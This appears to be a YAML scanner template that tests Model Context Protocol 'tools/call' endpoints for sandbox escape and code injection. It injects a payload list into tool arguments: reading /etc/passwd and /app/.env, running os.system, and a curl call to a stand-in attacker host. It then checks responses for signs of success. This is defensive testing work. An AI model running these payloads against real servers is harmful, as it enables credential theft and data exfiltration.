---
id: MCP_TOOLS_CALL_CODE_INJECTION_SANDBOX_ESCAPE
info:
  name: MCP Tools Call - Sandbox Escape Attempt via tool_input
  description: |
    This test assesses whether the `tools/call` method in MCP can be exploited to trigger a sandbox escape or unsafe execution behavior using crafted payloads passed in `tool_input`.
  details: |
    Certain tools may execute code or shell commands in a sandboxed environment. If user-controlled values inside `params.tool_input` are improperly sanitized, attackers can inject escape sequences, file system operations, or sensitive path access attempts to break out of the sandbox.
  impact: |
    If successful, this can lead to access to restricted host paths, reading internal files (e.g., `/etc/passwd`, `.env`), or performing outbound network calls, potentially leading to RCE, data exfiltration, or lateral movement.
  category:
    name: MCP_CODE_EXECUTION
    shortName: MCP_CODE_EXECUTION
    displayName: Model Context Protocol (MCP) Security - Code Execution
  subCategory: MCP_TOOLS_CALL_CODE_INJECTION
  severity: HIGH
  tags:
  - Sandbox Escape
  - Prompt Injection
  - Tools Call
  - Model Context Protocol
  references:
  - https://owasp.org/www-project-api-security/
  - https://modelcontextprotocol.io/specification/2025-06-18/server#tools-call
  cwe:
  - CWE-94
  - CWE-78
  - CWE-265
attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: SLOW
wordLists:
  sandboxEscapePayloads:
  - cat /etc/passwd
  - ls -la /proc
  - curl http://attacker.local/steal
  - import os; os.system('ls')
  - readFile('/app/.env')
api_selection_filters:
  method:
    eq: POST
  request_payload:
    contains_all:
    - method
    - tools/call
    - params
    for_one:
      key:
        contains_either: "$magic From the request body, locate the `params` object. Inside `params`, locate the `arguments` object if it exists. check for any parameter which is for pagination inside `arguments` object. Get the parameter key which controls the total number of records to fetch. If found then return the selected key. Else return empty braces []. Do not select the key `name`."
        extract: toolInputKey
      value:
        extract: toolInputVal
execute:
  type: single
  requests:
  - req:
    - modify_body_param:
        key: "${toolInputKey}"
        value: "${sandboxEscapePayloads}"
validate:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    contains_either:
    - root:x
    - uid=
    - /proc/
    - .env
    - command not found
    - permission denied
    - Traceback
    - stderr
    - "$magic Analyze the request and response. If the input caused a sandbox escape, sensitive file access, command execution, or unexpected tool behavior, return a list of symptoms observed. Else return []."
